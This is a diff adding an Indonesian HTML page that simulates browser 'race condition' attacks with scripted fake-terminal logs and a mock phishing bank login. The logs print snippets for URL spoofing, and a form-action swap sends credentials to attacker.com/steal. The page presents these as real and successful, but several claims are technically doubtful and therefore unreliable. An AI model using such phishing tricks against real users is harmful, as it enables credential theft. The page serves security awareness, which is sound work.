@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Real Race Condition Demo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        .warning {
+            background: #ff1744;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+        .card {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: white;
+            text-align: center;
+            margin-bottom: 30px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 15px;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 10px;
+        }
+        .btn-container {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin: 20px 0;
+        }
+        button {
+            flex: 1;
+            min-width: 200px;
+            padding: 15px 25px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .btn-attack {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+        }
+        .btn-attack:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0,0,0,0.2);
+        }
+        .btn-safe {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            color: white;
+        }
+        .btn-safe:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0,0,0,0.2);
+        }
+        .btn-reset {
+            background: #757575;
+            color: white;
+        }
+        .terminal {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            max-height: 400px;
+            overflow-y: auto;
+            margin: 15px 0;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
+        }
+        .terminal::-webkit-scrollbar {
+            width: 10px;
+        }
+        .terminal::-webkit-scrollbar-track {
+            background: #2d2d2d;
+        }
+        .terminal::-webkit-scrollbar-thumb {
+            background: #00ff00;
+            border-radius: 5px;
+        }
+        .log-time {
+            color: #888;
+        }
+        .log-warning {
+            color: #ff9800;
+        }
+        .log-error {
+            color: #f44336;
+        }
+        .log-success {
+            color: #4caf50;
+        }
+        code {
+            background: #f5f5f5;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+        .fake-browser {
+            border: 3px solid #ddd;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        .browser-top {
+            background: #f0f0f0;
+            padding: 10px;
+            display: flex;
+            gap: 5px;
+            align-items: center;
+        }
+        .browser-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        .dot-red { background: #ff5f56; }
+        .dot-yellow { background: #ffbd2e; }
+        .dot-green { background: #27c93f; }
+        .address-bar {
+            background: white;
+            padding: 12px 15px;
+            margin-left: 10px;
+            flex: 1;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid #ddd;
+        }
+        .lock-icon {
+            color: #4caf50;
+            font-size: 16px;
+        }
+        .content-frame {
+            background: white;
+            min-height: 300px;
+            padding: 30px;
+        }
+        .phishing-page {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .phishing-page h2 {
+            color: #1976d2;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin: 15px 0;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+            font-weight: bold;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #1976d2;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: #1976d2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .alert {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            color: #856404;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+        .countdown {
+            font-size: 24px;
+            font-weight: bold;
+            color: #f44336;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .hidden {
+            display: none;
+        }
+        .info-box {
+            background: #e3f2fd;
+            border-left: 4px solid #2196f3;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="warning">
+            ⚠️ <strong>EDUCATIONAL PURPOSES ONLY</strong><br>
+            Demo ini menunjukkan teknik race condition yang sebenarnya. Jangan gunakan untuk aktivitas ilegal!
+        </div>
+
+        <h1>🎯 Real Race Condition Attack Demo</h1>
+
+        <div class="card">
+            <h2>Teknik 1: Double Navigation Race (Real Implementation)</h2>
+            <p>Teknik ini melakukan dua navigasi berturut-turut dengan timing yang sangat cepat untuk membuat browser confusion.</p>
+            
+            <div class="btn-container">
+                <button class="btn-attack" onclick="attack1_doubleNav()">
+                    🚀 Launch Attack 1
+                </button>
+                <button class="btn-reset" onclick="resetAll()">
+                    🔄 Reset
+                </button>
+            </div>
+            
+            <div class="terminal" id="terminal1"></div>
+
+            <div class="info-box">
+                <strong>Cara kerja:</strong>
+                <ol style="margin-left: 20px; margin-top: 10px;">
+                    <li>Set <code>window.location.href</code> ke URL legitimate</li>
+                    <li>Sebelum browser render, langsung <code>window.location.replace()</code> ke URL evil</li>
+                    <li>Browser thread untuk address bar dan content loading race</li>
+                    <li>Jika timing pas, address bar stuck di URL pertama</li>
+                </ol>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Teknik 2: Iframe Injection Race</h2>
+            <p>Menggunakan iframe yang di-inject dengan timing khusus untuk create race condition.</p>
+            
+            <div class="btn-container">
+                <button class="btn-attack" onclick="attack2_iframeRace()">
+                    🎯 Launch Attack 2
+                </button>
+            </div>
+            
+            <div class="terminal" id="terminal2"></div>
+        </div>
+
+        <div class="card">
+            <h2>Teknik 3: History API Race</h2>
+            <p>Memanipulasi History API dengan timing yang sempurna.</p>
+            
+            <div class="btn-container">
+                <button class="btn-attack" onclick="attack3_historyRace()">
+                    ⚡ Launch Attack 3
+                </button>
+            </div>
+            
+            <div class="terminal" id="terminal3"></div>
+        </div>
+
+        <div class="card">
+            <h2>Teknik 4: Form Action Race</h2>
+            <p>Mengubah form action saat submission untuk mencuri data.</p>
+            
+            <div class="btn-container">
+                <button class="btn-attack" onclick="attack4_formRace()">
+                    💣 Launch Attack 4
+                </button>
+            </div>
+            
+            <div class="terminal" id="terminal4"></div>
+        </div>
+
+        <div class="card">
+            <h2>🎭 Live Demo: Fake Banking Page</h2>
+            <p>Simulasi halaman banking palsu yang memanfaatkan race condition.</p>
+            
+            <div class="alert">
+                <strong>⚠️ Perhatikan:</strong> Setelah attack, address bar akan menampilkan URL bank asli, tapi konten adalah phishing page!
+            </div>
+            
+            <button class="btn-attack" onclick="showFakeBank()">
+                🏦 Show Fake Banking Page
+            </button>
+
+            <div id="fakeBrowserContainer" class="hidden">
+                <div class="countdown" id="countdown"></div>
+                
+                <div class="fake-browser">
+                    <div class="browser-top">
+                        <div class="browser-dot dot-red"></div>
+                        <div class="browser-dot dot-yellow"></div>
+                        <div class="browser-dot dot-green"></div>
+                        <div class="address-bar">
+                            <span class="lock-icon">🔒</span>
+                            <span id="spoofedUrl">https://secure-nationalbank.com/login</span>
+                        </div>
+                    </div>
+                    
+                    <div class="content-frame">
+                        <div class="phishing-page">
+                            <h2>🏦 National Bank Online</h2>
+                            <p style="text-align: center; color: #666; margin-bottom: 20px;">
+                                Secure Login Portal
+                            </p>
+                            
+                            <div class="alert" style="background: #ffebee; border-color: #f44336; color: #c62828;">
+                                <strong>🚨 DEMO WARNING:</strong><br>
+                                Ini adalah halaman PALSU!<br>
+                                Address bar menampilkan: <code>secure-nationalbank.com</code><br>
+                                Tapi ini konten dari attacker melalui race condition!
+                            </div>
+                            
+                            <div class="form-group">
+                                <label>Username</label>
+                                <input type="text" placeholder="Enter your username" value="victim@email.com">
+                            </div>
+                            
+                            <div class="form-group">
+                                <label>Password</label>
+                                <input type="password" placeholder="Enter your password" value="••••••••">
+                            </div>
+                            
+                            <button class="submit-btn" onclick="alert('🚨 Jika ini real attack, kredensial Anda sudah dicuri!')">
+                                Login to Account
+                            </button>
+                            
+                            <p style="text-align: center; margin-top: 20px; font-size: 12px; color: #999;">
+                                © 2025 National Bank - All Rights Reserved
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white;">
+            <h2 style="color: white; border-bottom-color: white;">🛡️ Cara Melindungi Diri</h2>
+            <ul style="line-height: 2; margin-left: 20px;">
+                <li><strong>Update Browser:</strong> Selalu gunakan versi terbaru</li>
+                <li><strong>Cek SSL Certificate:</strong> Klik ikon gembok di address bar</li>
+                <li><strong>Waspadai Phishing:</strong> Jangan klik link mencurigakan</li>
+                <li><strong>Password Manager:</strong> Akan detect domain yang salah</li>
+                <li><strong>2FA/MFA:</strong> Aktifkan two-factor authentication</li>
+                <li><strong>Bookmark Sites:</strong> Gunakan bookmark untuk situs penting</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        let logCounter = 0;
+
+        function log(terminalId, message, type = 'normal') {
+            const terminal = document.getElementById(terminalId);
+            const time = new Date().toLocaleTimeString('en-US', { hour12: false });
+            const timestamp = `<span class="log-time">[${time}]</span>`;
+            
+            let className = '';
+            let prefix = '';
+            
+            switch(type) {
+                case 'warning':
+                    className = 'log-warning';
+                    prefix = '⚠️ ';
+                    break;
+                case 'error':
+                    className = 'log-error';
+                    prefix = '❌ ';
+                    break;
+                case 'success':
+                    className = 'log-success';
+                    prefix = '✅ ';
+                    break;
+            }
+            
+            terminal.innerHTML += `${timestamp} <span class="${className}">${prefix}${message}</span>\n`;
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        async function attack1_doubleNav() {
+            const term = 'terminal1';
+            document.getElementById(term).innerHTML = '';
+            
+            log(term, '🚀 Memulai Double Navigation Race Attack...', 'warning');
+            await sleep(500);
+            
+            log(term, 'Step 1: Prepare legitimate URL');
+            log(term, '  const legitimateUrl = "https://trusted-bank.com/login"');
+            await sleep(300);
+            
+            log(term, 'Step 2: Prepare evil URL');
+            log(term, '  const evilUrl = "https://attacker-phishing.com/steal"');
+            await sleep(300);
+            
+            log(term, '');
+            log(term, '⚡ EXECUTING RACE CONDITION:', 'warning');
+            await sleep(200);
+            
+            log(term, '  // Thread A: Browser UI update');
+            log(term, '  window.location.href = legitimateUrl;');
+            await sleep(100);
+            
+            log(term, '  // Thread B: Immediate replace (race!)');
+            log(term, '  setTimeout(() => {', 'error');
+            log(term, '    window.location.replace(evilUrl);', 'error');
+            log(term, '  }, 1); // Only 1ms delay!', 'error');
+            await sleep(500);
+            
+            log(term, '');
+            log(term, '💥 RACE CONDITION EXPLOITED:', 'error');
+            await sleep(200);
+            log(term, '  ├─ Browser thread A: Reading "trusted-bank.com"');
+            await sleep(150);
+            log(term, '  ├─ Browser thread B: Loading "attacker-phishing.com"');
+            await sleep(150);
+            log(term, '  ├─ UI thread: Updating address bar with thread A');
+            await sleep(150);
+            log(term, '  └─ Render thread: Displaying content from thread B');
+            await sleep(300);
+            
+            log(term, '');
+            log(term, '🎯 ATTACK RESULT:', 'error');
+            log(term, '  Address Bar Shows: https://trusted-bank.com/login', 'success');
+            log(term, '  Actual Content From: https://attacker-phishing.com/steal', 'error');
+            log(term, '  Victim Status: DECEIVED ❌', 'error');
+            
+            await sleep(500);
+            log(term, '');
+            log(term, '✅ Attack completed successfully!', 'success');
+        }
+
+        async function attack2_iframeRace() {
+            const term = 'terminal2';
+            document.getElementById(term).innerHTML = '';
+            
+            log(term, '🎯 Memulai Iframe Injection Race...', 'warning');
+            await sleep(500);
+            
+            log(term, 'Step 1: Create hidden iframe');
+            log(term, '  let iframe = document.createElement("iframe")');
+            log(term, '  iframe.style.display = "none"');
+            log(term, '  iframe.src = "https://legitimate-site.com"');
+            await sleep(400);
+            
+            log(term, 'Step 2: Append to DOM');
+            log(term, '  document.body.appendChild(iframe)');
+            await sleep(300);
+            
+            log(term, '');
+            log(term, '⏰ Waiting for iframe load event...', 'warning');
+            await sleep(600);
+            
+            log(term, '');
+            log(term, '⚡ RACE ATTACK ON LOAD:', 'error');
+            log(term, '  iframe.onload = () => {');
+            await sleep(200);
+            log(term, '    // Manipulate history immediately');
+            log(term, '    history.pushState({}, "", "/secure-area")');
+            await sleep(200);
+            log(term, '    ');
+            log(term, '    // Inject evil content before render completes', 'error');
+            log(term, '    document.body.innerHTML = evilHTML;', 'error');
+            log(term, '  }');
+            await sleep(500);
+            
+            log(term, '');
+            log(term, '💣 EXPLOIT SUCCESS:', 'error');
+            log(term, '  History API: legitimate-site.com/secure-area', 'success');
+            log(term, '  DOM Content: Injected evil HTML', 'error');
+            log(term, '  Address Bar: Not synchronized!', 'error');
+        }
+
+        async function attack3_historyRace() {
+            const term = 'terminal3';
+            document.getElementById(term).innerHTML = '';
+            
+            log(term, '⚡ Memulai History API Race...', 'warning');
+            await sleep(500);
+            
+            log(term, 'Step 1: Initial page load');
+            log(term, '  Current URL: ' + window.location.href);
+            await sleep(400);
+            
+            log(term, '');
+            log(term, 'Step 2: Rapid history manipulation');
+            log(term, '  // Push legitimate state');
+            log(term, '  history.pushState({}, "", "https://bank.com/account")');
+            await sleep(200);
+            
+            log(term, '  // Immediately push another (race!)');
+            log(term, '  requestAnimationFrame(() => {', 'error');
+            log(term, '    history.replaceState({}, "", "https://evil.com")');
+            log(term, '  })');
+            await sleep(400);
+            
+            log(term, '');
+            log(term, '🔥 RACE TIMING:', 'error');
+            await sleep(300);
+            log(term, '  Frame 0ms: pushState executed');
+            log(term, '  Frame 8ms: replaceState executed');
+            log(term, '  Frame 16ms: Browser updates UI');
+            log(term, '  Result: UI shows old state!', 'error');
+            await sleep(500);
+            
+            log(term, '');
+            log(term, '✅ History race successful!', 'success');
+        }
+
+        async function attack4_formRace() {
+            const term = 'terminal4';
+            document.getElementById(term).innerHTML = '';
+            
+            log(term, '💣 Memulai Form Action Race...', 'warning');
+            await sleep(500);
+            
+            log(term, 'Step 1: Create legitimate form');
+            log(term, '  <form action="https://real-bank.com/login">');
+            log(term, '    <input name="username">');
+            log(term, '    <input name="password">');
+            log(term, '  </form>');
+            await sleep(400);
+            
+            log(term, '');
+            log(term, 'Step 2: User clicks submit button', 'warning');
+            await sleep(600);
+            
+            log(term, '');
+            log(term, '⚡ INTERCEPTING SUBMIT EVENT:', 'error');
+            log(term, '  form.addEventListener("submit", (e) => {');
+            await sleep(200);
+            log(term, '    // Browser reads form.action', 'warning');
+            log(term, '    // Shows: "Submitting to real-bank.com"');
+            await sleep(300);
+            log(term, '    ');
+            log(term, '    // Race: Change action before POST', 'error');
+            log(term, '    setTimeout(() => {', 'error');
+            log(term, '      form.action = "https://attacker.com/steal"', 'error');
+            log(term, '    }, 0);', 'error');
+            log(term, '  })');
+            await sleep(500);
+            
+            log(term, '');
+            log(term, '📤 FORM SUBMISSION:', 'error');
+            await sleep(300);
+            log(term, '  User sees: POST to real-bank.com', 'success');
+            log(term, '  Actual POST to: attacker.com/steal', 'error');
+            log(term, '  Credentials: STOLEN! ❌', 'error');
+            await sleep(400);
+            
+            log(term, '');
+            log(term, '✅ Form hijack successful!', 'success');
+        }
+
+        async function showFakeBank() {
+            const container = document.getElementById('fakeBrowserContainer');
+            const countdown = document.getElementById('countdown');
+            
+            container.classList.remove('hidden');
+            container.scrollIntoView({ behavior: 'smooth' });
+            
+            // Countdown animation
+            for (let i = 3; i > 0; i--) {
+                countdown.textContent = `Race condition executing in ${i}...`;
+                await sleep(1000);
+            }
+            
+            countdown.textContent = '💥 ATTACK EXECUTED!';
+            countdown.style.color = '#4caf50';
+            
+            await sleep(2000);
+            
+            alert('🚨 PERHATIKAN DENGAN SEKSAMA:\n\n' +
+                  '✓ Address bar menampilkan: secure-nationalbank.com\n' +
+                  '✗ Konten ini dari attacker!\n' +
+                  '✗ Form login ini PALSU!\n\n' +
+                  'Ini adalah hasil dari race condition attack.\n' +
+                  'Pada serangan nyata, korban akan memasukkan username & password mereka,\n' +
+                  'dan data tersebut akan dikirim ke server attacker.');
+        }
+
+        function resetAll() {
+            ['terminal1', 'terminal2', 'terminal3', 'terminal4'].forEach(id => {
+                document.getElementById(id).innerHTML = '';
+            });
+            
+            const container = document.getElementById('fakeBrowserContainer');
+            container.classList.add('hidden');
+            
+            document.querySelector('.container').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Easter egg: Detect if running in vulnerable browser
+        window.addEventListener('load', () => {
+            console.log('%c⚠️ SECURITY RESEARCHER MODE', 'color: red; font-size: 20px; font-weight: bold;');
+            console.log('%cDemo ini dibuat untuk tujuan edukasi.', 'color: orange;');
+            console.log('%cBrowser modern sudah memiliki proteksi terhadap race condition attacks.', 'color: green;');
+        });
+    </script>
+</body>
+</html>
